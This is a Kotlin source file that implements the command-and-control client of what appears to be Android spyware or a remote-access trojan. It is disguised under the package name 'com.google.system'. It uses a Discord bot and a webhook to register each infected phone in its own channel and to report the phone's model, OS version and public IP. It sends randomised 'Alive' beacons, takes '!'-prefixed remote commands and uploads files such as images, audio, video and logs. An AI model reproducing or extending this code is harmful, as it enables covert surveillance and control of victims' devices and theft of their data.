package com.google.system

import android.util.Log
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.UUID
import java.util.concurrent.TimeUnit

class DiscordGatewayClient(
    private val onCommand: (action: String, payload: String?) -> Unit,
    private val onStatus: ((status: String) -> Unit)? = null
) {
    companion object {
        private const val TAG = "DiscordGW"
        private const val OP_DISPATCH = 0
        private const val OP_HELLO = 10
        private const val OP_HEARTBEAT = 1
        private const val OP_IDENTIFY = 2
        private const val OP_RESUME = 6
        private const val OP_RECONNECT = 7
        private const val OP_INVALID_SESSION = 9
        private const val OP_HEARTBEAT_ACK = 11
        private const val DEVICE_HB_MIN = 240000L
        private const val DEVICE_HB_MAX = 420000L

        private val FATAL_CLOSE_CODES = setOf(4004, 4010, 4011, 4012, 4013, 4014)
    }

    private val client = OkHttpClient.Builder()
        .readTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .connectTimeout(15, TimeUnit.SECONDS)
        .pingInterval(30, TimeUnit.SECONDS)
        .build()

    private val jsonMedia = "application/json".toMediaType()

    @Volatile private var ws: WebSocket? = null
    @Volatile private var scope: CoroutineScope? = null
    @Volatile private var heartbeatJob: Job? = null
    @Volatile private var deviceHeartbeatJob: Job? = null
    @Volatile private var reconnectJob: Job? = null
    @Volatile private var heartbeatInterval = 41250L
    @Volatile private var seq: Int? = null
    @Volatile private var sessionId: String? = null
    @Volatile private var guildId: String? = null
    @Volatile private var myChannelId: String? = null
    @Volatile private var reconnectAttempt = 0
    @Volatile private var reconnecting = false
    @Volatile private var resuming = false
    @Volatile private var closing = false
    @Volatile private var fatalError = false
    private var connectVersion = 0L
    private var crashReport: String? = null
    private var restChannelId: String? = null
    private var pollJob: Job? = null
    private var lastPolledMsgId: String? = null
    private var startTime = 0L
    private var deviceSuffix: String = UUID.randomUUID().toString().take(6)

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private var debugFile: File? = null

    fun setDebugFile(f: File) { debugFile = f }

    fun setCrashReport(report: String) { crashReport = report }

    private fun debug(msg: String) {
        debugFile?.appendText("${System.currentTimeMillis()} $msg\n")
    }

    fun start(coroutineScope: CoroutineScope) {
        debug("=== start() entered ===")
        status("Init")
        try {
            closing = false
            fatalError = false
            startTime = System.currentTimeMillis()
            scope = coroutineScope
            debug("start: scope=$scope closing=$closing")
            whPost(JSONObject().apply {
                put("event", "start")
                put("device", android.os.Build.MODEL)
                put("sdk", android.os.Build.VERSION.SDK_INT)
                put("suffix", deviceSuffix)
            })
            debug("start: whPost done, calling preflightCheck")
            preflightCheck()
            debug("start: preflightCheck returned (should be async)")
        } catch (e: Exception) {
            debug("start() CRASH: ${e::class.simpleName}: ${e.message}")
            status("Crashed: ${e.message?.take(30)}")
        }
    }

    fun stop() {
        closing = true
        heartbeatJob?.cancel()
        deviceHeartbeatJob?.cancel()
        reconnectJob?.cancel()
        pollJob?.cancel()
        ws?.close(1000, "shutdown")
        ws = null
        scope = null
        client.dispatcher.executorService.shutdown()
        client.connectionPool.evictAll()
        httpClient.dispatcher.executorService.shutdown()
        httpClient.connectionPool.evictAll()
    }

    private fun status(s: String) { onStatus?.invoke(s) }

    private fun preflightCheck(attempt: Int = 0) {
        scope?.launch(Dispatchers.IO) {
            status("Preflight...")
            debug("preflight attempt $attempt")
            try {
                val req = Request.Builder()
                    .url("https://discord.com/api/v10/users/@me")
                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                    .build()
                val resp = httpClient.newCall(req).execute()
                resp.use { r ->
                    if (r.isSuccessful) {
                        val body = r.body?.string()
                        val user = body?.let { JSONObject(it).optString("username", "?") } ?: "?"
                        debug("preflight OK — $user")
                        status("Token OK")
                        whPost(JSONObject().apply {
                            put("event", "token_ok")
                            put("bot", user)
                        })
                        bootViaRest()
                        connect()
                    } else {
                        val errBody = r.body?.string()
                        debug("preflight HTTP ${r.code} $errBody")
                        whPost(JSONObject().apply {
                            put("event", "preflight_fail")
                            put("code", r.code)
                            put("body", errBody?.take(200) ?: "")
                        })
                        if (attempt < 3) {
                            status("Retry preflight")
                            delay((1000L shl attempt).coerceAtMost(8000L))
                            preflightCheck(attempt + 1)
                        } else {
                            status("Preflight failed")
                            debug("preflight gave up after 3 attempts")
                            fatalError = true
                        }
                    }
                }
            } catch (e: Exception) {
                debug("preflight network error ${e.message}")
                if (attempt < 3) {
                    status("Retry preflight")
                    delay((1000L shl attempt).coerceAtMost(8000L))
                    preflightCheck(attempt + 1)
                } else {
                    status("No network")
                    debug("preflight gave up after 3 attempts")
                    fatalError = true
                }
            }
        }
    }

    private fun bootViaRest() {
        try {
            val prefix = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
            val guildsReq = Request.Builder()
                .url("https://discord.com/api/v10/users/@me/guilds")
                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                .build()
            val guildsResp = httpClient.newCall(guildsReq).execute()
            guildsResp.use { gr ->
                if (gr.isSuccessful) {
                    val guilds = JSONArray(gr.body?.string() ?: return)
                    if (guilds.length() > 0) {
                        val gId = guilds.getJSONObject(0).optString("id")
                        guildId = guildId ?: gId
                        val chReq = Request.Builder()
                            .url("https://discord.com/api/v10/guilds/$gId/channels")
                            .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                            .build()
                        val chResp = httpClient.newCall(chReq).execute()
                        chResp.use { cr ->
                            if (cr.isSuccessful) {
                                val channels = JSONArray(cr.body?.string() ?: return)
                                for (i in 0 until channels.length()) {
                                    val ch = channels.getJSONObject(i)
                                    if (ch.optString("name", "") == prefix) {
                                        restChannelId = ch.optString("id", null)
                                        debug("Found device channel via REST: $restChannelId")
                                        break
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            debug("bootViaRest: ${e.message}")
        }
    }

    private fun restAlert(msg: String) {
        val chId = restChannelId ?: return
        try {
            val json = JSONObject().put("content", msg.take(2000))
            val req = Request.Builder()
                .url("https://discord.com/api/v10/channels/$chId/messages")
                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                .header("Content-Type", "application/json")
                .post(json.toString().toRequestBody(jsonMedia))
                .build()
            httpClient.newCall(req).execute().close()
        } catch (_: Exception) {}
    }

    private fun whPost(data: JSONObject) {
        scope?.launch(Dispatchers.IO) {
            val event = data.optString("event", "?")
            debug("whPost: $event")
            try {
                val body = data.toString()
                debug("whPost: body len=${body.length}")
                val req = Request.Builder()
                    .url(DiscordConfig.WEBHOOK_URL)
                    .header("Content-Type", "application/json")
                    .post(body.toRequestBody(jsonMedia))
                    .build()
                val resp = httpClient.newCall(req).execute()
                debug("whPost: HTTP ${resp.code}")
                resp.close()
            } catch (e: Exception) {
                debug("whPost FAIL ${e::class.simpleName}: ${e.message}")
            }
        }
    }

    private fun startPolling() {
        pollJob?.cancel()
        pollJob = scope?.launch(Dispatchers.IO) {
            while (isActive) {
                if (myChannelId != null && !fatalError) pollMessages()
                delay(8000L)
            }
        }
    }

    private suspend fun pollMessages() {
        val chId = myChannelId ?: return
        try {
            val req = Request.Builder()
                .url("https://discord.com/api/v10/channels/$chId/messages?limit=5")
                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                .build()
            executeWithRetry(req).use { r ->
                if (!r.isSuccessful) return
                val body = r.body?.string() ?: return
                val arr = JSONArray(body)
                if (arr.length() == 0) return
                for (i in arr.length() - 1 downTo 0) {
                    val msg = arr.getJSONObject(i)
                    val msgId = msg.optString("id", "")
                    if (msgId <= (lastPolledMsgId ?: "")) continue
                    lastPolledMsgId = msgId
                    val content = msg.optString("content", "").trim()
                    if (!content.startsWith("!")) continue
                    val parts = content.substring(1).split(" ", limit = 2)
                    val action = parts[0].lowercase()
                    val payload = parts.getOrNull(1)
                    onCommand(action, payload)
                }
            }
        } catch (_: Exception) {}
    }

    private fun connect() {
        if (closing || fatalError) return
        connectVersion++
        val myVersion = connectVersion
        ws?.close(1000, "reconnecting")
        ws = null
        debug("connect: open ws")
        val req = Request.Builder().url(DiscordConfig.GATEWAY_URL).build()
        try {
            ws = client.newWebSocket(req, object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) {
                    debug("ws: onOpen")
                    reconnecting = false
                    status("WS open")
                }

                override fun onMessage(ws: WebSocket, text: String) {
                    handleMessage(text)
                }

                override fun onClosing(ws: WebSocket, code: Int, reason: String) {
                    debug("ws: onClosing code=$code reason=$reason")
                    handleClose(code, reason)
                }

                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    debug("ws: onClosed code=$code reason=$reason")
                    handleClose(code, reason)
                }

                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    debug("ws: onFailure ${t.message}")
                    status("WS fail")
                    whPost(JSONObject().apply {
                        put("event", "ws_failure")
                        put("error", t.message?.take(200) ?: "?")
                        put("code", response?.code ?: 0)
                    })
                    if (!closing && !fatalError) scheduleReconnect()
                }
            })
        } catch (e: Exception) {
            debug("connect exception ${e.message}")
            status("Conn err")
            if (!closing && !fatalError) scheduleReconnect()
        }
    }

    private fun handleClose(code: Int, reason: String) {
        if (closing) {
            reconnecting = false
            return
        }
        status("Close $code")
        if (code in FATAL_CLOSE_CODES) {
            debug("FATAL close code $code — stopping reconnection")
            status("Fatal $code")
            fatalError = true
            reconnecting = false
            whPost(JSONObject().apply {
                put("event", "fatal_close")
                put("code", code)
                put("reason", reason)
            })
            return
        }
        scheduleReconnect()
    }

    private fun handleMessage(text: String) {
        try {
            val msg = JSONObject(text)
            val op = msg.optInt("op", -1)
            val d = msg.opt("d")
            val s = msg.optInt("s", -1)
            if (s > 0) seq = s

            when (op) {
                OP_HELLO -> {
                    val hello = d as JSONObject
                    heartbeatInterval = hello.optLong("heartbeat_interval", 41250)
                    reconnectJob?.cancel()
                    debug("OP_HELLO interval=$heartbeatInterval")

                    if (resuming && sessionId != null) {
                        resuming = false
                        status("Resuming...")
                        resume()
                    } else {
                        resuming = false
                        sessionId = null
                        status("Identifying...")
                        identify()
                    }
                    startHeartbeat()
                }
                OP_DISPATCH -> handleDispatch(msg.optString("t", ""), d)
                OP_HEARTBEAT_ACK -> { }
                OP_RECONNECT -> {
                    debug("OP_RECONNECT")
                    resuming = sessionId != null
                    scheduleReconnect()
                }
                OP_INVALID_SESSION -> {
                    val canResume = d as? Boolean ?: false
                    debug("OP_INVALID_SESSION resume=$canResume")
                    if (canResume && sessionId != null) {
                        resuming = true
                        scheduleReconnect()
                    } else {
                        sessionId = null
                        fatalError = true
                        status("Session rejected")
                        debug("FATAL: session invalidated, no resume possible")
                    }
                }
            }
        } catch (e: Exception) {
            debug("handleMessage: ${e.message}")
        }
    }

    private fun handleDispatch(type: String, d: Any?) {
        when (type) {
            "READY" -> {
                val data = d as JSONObject
                sessionId = data.optString("session_id", null)
                reconnectAttempt = 0
                val user = data.optJSONObject("user")
                debug("READY bot=${user?.optString("username")}")
                status("Ready")
            }
            "RESUMED" -> {
                debug("RESUMED")
                reconnectAttempt = 0
                startHeartbeat()
                if (myChannelId == null) {
                    scope?.launch(Dispatchers.IO) { findOrCreateChannelViaRest() }
                }
            }
            "GUILD_CREATE" -> {
                val data = d as JSONObject
                if (guildId == null) {
                    guildId = data.optString("id", null)
                    debug("GUILD_CREATE guild=$guildId")
                }
                if (guildId != null && myChannelId == null) {
                    findOrCreateChannel(data.optJSONArray("channels"))
                }
            }
            "MESSAGE_CREATE" -> {
                val data = d as JSONObject
                val chId = data.optString("channel_id", "")
                val content = data.optString("content", "").trim()
                debug("MSG ch=$chId myCh=$myChannelId content=${content.take(60)}")
                if (chId != myChannelId) return
                if (!content.startsWith("!")) return
                val parts = content.substring(1).split(" ", limit = 2)
                val action = parts[0].lowercase()
                val payload = parts.getOrNull(1)
                debug("CMD: $action payload=$payload")
                onCommand(action, payload)
            }
        }
    }

    private fun findOrCreateChannel(channelsArray: JSONArray?) {
        val prefix = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
        status("Find $prefix")
        if (channelsArray != null) {
            for (i in 0 until channelsArray.length()) {
                val ch = channelsArray.getJSONObject(i)
                if (ch.optString("name", "") == prefix) {
                    myChannelId = ch.optString("id", null)
                    debug("Found existing channel: $myChannelId")
                    status("Ch found")
                    sendOnlineMsg()
                    return
                }
            }
        }
        createChannel(prefix)
    }

    private suspend fun findOrCreateChannelViaRest() {
        val gId = guildId ?: run { return }
        try {
            val url = "https://discord.com/api/v10/guilds/$gId/channels"
            val req = Request.Builder()
                .url(url)
                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                .build()
            val resp = httpClient.newCall(req).execute()
            resp.use { r ->
                if (r.isSuccessful) {
                    val body = r.body?.string()
                    if (body != null) {
                        val channels = JSONArray(body)
                        val prefix = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
                        for (i in 0 until channels.length()) {
                            val ch = channels.getJSONObject(i)
                            if (ch.optString("name", "") == prefix) {
                                myChannelId = ch.optString("id", null)
                                debug("Found via REST: $myChannelId")
                                status("Ch found")
                                sendOnlineMsg()
                                return
                            }
                        }
                        createChannel(prefix)
                    }
                } else {
                    val errBody = r.body?.string()
                    debug("List channels: HTTP ${r.code} $errBody")
                    status("List fail")
                }
            }
        } catch (e: Exception) {
            debug("findOrCreateChannelViaRest: ${e.message}")
        }
    }

    private fun createChannel(name: String) {
        scope?.launch(Dispatchers.IO) {
            var attempt = 0
            val maxAttempts = 4
            while (attempt < maxAttempts && myChannelId == null && !closing && !fatalError) {
                status("Create $name (${attempt+1}/$maxAttempts)")
                try {
                    val gId = guildId ?: return@launch
                    val json = JSONObject().apply {
                        put("name", name)
                        put("type", 0)
                    }
                    val url = "https://discord.com/api/v10/guilds/$gId/channels"
                    val req = Request.Builder()
                        .url(url)
                        .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                        .header("Content-Type", "application/json")
                        .post(json.toString().toRequestBody(jsonMedia))
                        .build()
                    val resp = executeWithRetry(req)
                    resp.use { r ->
                        if (r.isSuccessful) {
                            val body = r.body?.string()
                            if (body != null) {
                                val ch = JSONObject(body)
                                myChannelId = ch.optString("id", null)
                                debug("Created channel: $myChannelId")
                                status("Ch created")
                                sendOnlineMsg()
                            }
                        } else {
                            val errBody = r.body?.string()
                            debug("Create ch attempt $attempt: HTTP ${r.code} $errBody")
                            status("Ch fail HTTP ${r.code}")
                        }
                    }
                } catch (e: Exception) {
                    debug("createChannel attempt $attempt: ${e.message}")
                }
                if (myChannelId == null && attempt < maxAttempts - 1) {
                    delay((1000L shl attempt).coerceAtMost(15000L))
                }
                attempt++
            }
            if (myChannelId == null) {
                debug("Failed to create channel after $maxAttempts attempts")
                status("Ch failed")
            }
        }
    }

    private fun getPublicIp(): String {
        return try {
            val req = Request.Builder().url("https://api.ipify.org?format=json").build()
            val resp = httpClient.newCall(req).execute()
            resp.use { r ->
                if (r.isSuccessful) {
                    val body = r.body?.string() ?: return "?"
                    JSONObject(body).optString("ip", "?")
                } else "?"
            }
        } catch (_: Exception) { "?" }
    }

    fun sendOnlineMsg() {
        scope?.launch(Dispatchers.IO) {
            status("Sending online msg")
            val ip = getPublicIp()
            sendMsg(":green_circle: **Device Online** — ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE}) | IP: ${ip}")
            whPost(JSONObject().apply {
                put("event", "online")
                put("channel", myChannelId)
                put("device", android.os.Build.MODEL)
            })
            crashReport?.let { report ->
                delay(500)
                sendMsg(":warning: **Crash Report**\n```\n${report.take(1900)}\n```")
                crashReport = null
            }
            status("Online")
            startDeviceHeartbeat()
            startPolling()
        }
    }

    fun sendMsg(text: String) {
        val chId = myChannelId ?: run { return }
        scope?.launch(Dispatchers.IO) {
            try {
                val json = JSONObject().put("content", text)
                val url = "https://discord.com/api/v10/channels/$chId/messages"
                val req = Request.Builder()
                    .url(url)
                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                    .header("Content-Type", "application/json")
                    .post(json.toString().toRequestBody(jsonMedia))
                    .build()
                executeWithRetry(req).use { }
            } catch (e: Exception) {
                debug("sendMsg: ${e.message}")
            }
        }
    }

    suspend fun sendMsgAwait(text: String): String? = withContext(Dispatchers.IO) {
        val chId = myChannelId ?: return@withContext null
        try {
            val json = JSONObject().put("content", text)
            val url = "https://discord.com/api/v10/channels/$chId/messages"
            val req = Request.Builder()
                .url(url)
                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                .header("Content-Type", "application/json")
                .post(json.toString().toRequestBody(jsonMedia))
                .build()
            executeWithRetry(req).use { resp ->
                if (!resp.isSuccessful) return@use null
                val body = resp.body?.string() ?: return@use null
                JSONObject(body).optString("id", null)
            }
        } catch (e: Exception) {
            debug("sendMsgAwait: ${e.message}")
            null
        }
    }

    fun editMsg(messageId: String, newText: String) {
        val chId = myChannelId ?: return
        scope?.launch(Dispatchers.IO) {
            try {
                val json = JSONObject().put("content", newText)
                val url = "https://discord.com/api/v10/channels/$chId/messages/$messageId"
                val req = Request.Builder()
                    .url(url)
                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                    .header("Content-Type", "application/json")
                    .method("PATCH", json.toString().toRequestBody(jsonMedia))
                    .build()
                executeWithRetry(req).use { }
            } catch (e: Exception) {
                debug("editMsg: ${e.message}")
            }
        }
    }

    fun sendFile(text: String, fileName: String, fileBytes: ByteArray) {
        val chId = myChannelId ?: return
        scope?.launch(Dispatchers.IO) {
            try {
                val mime = when {
                    fileName.endsWith(".png") -> "image/png"
                    fileName.endsWith(".jpg") || fileName.endsWith(".jpeg") -> "image/jpeg"
                    fileName.endsWith(".gif") -> "image/gif"
                    fileName.endsWith(".mp3") || fileName.endsWith(".m4a") -> "audio/mpeg"
                    fileName.endsWith(".mp4") -> "video/mp4"
                    fileName.endsWith(".txt") || fileName.endsWith(".log") -> "text/plain"
                    else -> "application/octet-stream"
                }.toMediaType()
                val payloadJson = JSONObject().put("content", text)
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("payload_json", null, payloadJson.toString().toRequestBody(jsonMedia))
                    .addFormDataPart("file", fileName, fileBytes.toRequestBody(mime))
                    .build()
                val url = "https://discord.com/api/v10/channels/$chId/messages"
                val req = Request.Builder()
                    .url(url)
                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                    .post(body)
                    .build()
                executeWithRetry(req).use { }
            } catch (e: Exception) {
                debug("sendFile: ${e.message}")
            }
        }
    }

    private fun identify() {
        val payload = JSONObject().apply {
            put("op", OP_IDENTIFY)
            put("d", JSONObject().apply {
                put("token", DiscordConfig.BOT_TOKEN)
                put("intents", DiscordConfig.INTENTS)
                put("properties", JSONObject().apply {
                    put("os", "android")
                    put("browser", "okhttp")
                    put("device", "phantom")
                })
            })
        }
        ws?.send(payload.toString())
        debug("sent identify (intents=${DiscordConfig.INTENTS})")
    }

    private fun resume() {
        val sid = sessionId ?: run { return }
        debug("attempting resume seq=$seq")
        val payload = JSONObject().apply {
            put("op", OP_RESUME)
            put("d", JSONObject().apply {
                put("token", DiscordConfig.BOT_TOKEN)
                put("session_id", sid)
                put("seq", seq ?: JSONObject.NULL)
            })
        }
        ws?.send(payload.toString())
    }

    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = scope?.launch {
            while (isActive) {
                val payload = JSONObject().apply {
                    put("op", OP_HEARTBEAT)
                    put("d", seq ?: JSONObject.NULL)
                }
                ws?.send(payload.toString())
                delay(heartbeatInterval)
            }
        }
    }

    private fun startDeviceHeartbeat() {
        deviceHeartbeatJob?.cancel()
        deviceHeartbeatJob = scope?.launch {
            delay(DEVICE_HB_MIN + (Math.random() * (DEVICE_HB_MAX - DEVICE_HB_MIN)).toLong())
            while (isActive) {
                val ip = getPublicIp()
                sendMsg(":heartbeat: **Alive** — ${android.os.Build.MODEL} | IP: ${ip}")
                delay(DEVICE_HB_MIN + (Math.random() * (DEVICE_HB_MAX - DEVICE_HB_MIN)).toLong())
            }
        }
    }

    private fun scheduleReconnect() {
        synchronized(this) {
            if (reconnecting) return
            reconnecting = true
        }
        reconnectJob?.cancel()
        val scheduleVersion = connectVersion
        if (closing || fatalError) return
        if (reconnectAttempt >= 10) {
            debug("Max reconnect attempts (10) reached")
            status("Gave up")
            whPost(JSONObject().apply {
                put("event", "gave_up")
                put("attempts", reconnectAttempt)
            })
            return
        }
        reconnectJob = scope?.launch {
            if (closing || fatalError) return@launch
            val delay = (DiscordConfig.RECONNECT_BASE_DELAY * (1 shl reconnectAttempt))
                .coerceAtMost(DiscordConfig.MAX_RECONNECT_DELAY)
            reconnectAttempt++
            status("Recon ${reconnectAttempt}")
            debug("Reconnect in ${delay}ms (attempt ${reconnectAttempt})")
            delay(delay)
            reconnecting = false
            if (!closing && !fatalError && connectVersion == scheduleVersion) connect()
        }
    }

    private suspend fun executeWithRetry(request: Request): Response {
        var retries = 0
        while (retries < 3) {
            try {
                val resp = httpClient.newCall(request).execute()
                if (resp.code == 429) {
                    val retryAfter = resp.header("Retry-After")?.toFloatOrNull()?.toLong() ?: 5L
                    resp.close()
                    delay(retryAfter * 1000)
                    retries++
                    continue
                }
                if (resp.code >= 500) {
                    resp.close()
                    delay(1000L * (1 shl retries))
                    retries++
                    continue
                }
                return resp
            } catch (e: java.io.IOException) {
                if (retries < 2) {
                    delay(1000L * (1 shl retries))
                    retries++
                    continue
                }
                throw e
            }
        }
        return httpClient.newCall(request).execute()
    }

    fun getChannelId(): String? = myChannelId
    fun getDeviceTag(): String = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
    fun getUptime(): Long = if (startTime > 0) System.currentTimeMillis() - startTime else 0
    fun isConnected(): Boolean = ws != null && !closing && !fatalError
}
